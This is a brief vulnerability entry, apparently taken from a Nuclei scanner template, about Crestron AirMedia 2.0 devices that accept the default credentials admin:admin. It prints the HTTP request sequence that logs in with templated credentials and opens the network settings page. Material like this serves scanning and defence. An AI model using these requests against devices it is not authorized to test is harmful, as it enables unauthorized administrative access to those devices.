# Vulnerability: Crestron Airmedia 2.0 - Default Login
**Classification:** CRESTRON
**Source:** Nuclei Template (`crestron-airmedia-default-login.yaml`)

## Description
Crestron AirMedia 2.0 devices contain default credentials (admin:admin) that allow unauthorized administrative access to device configuration and control.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /userlogin.html HTTP/1.1
Host: {{Hostname}}

POST /userlogin.html HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

login={{username}}&passwd={{password}}

GET /webView/Network HTTP/1.1
Host: {{Hostname}}
```

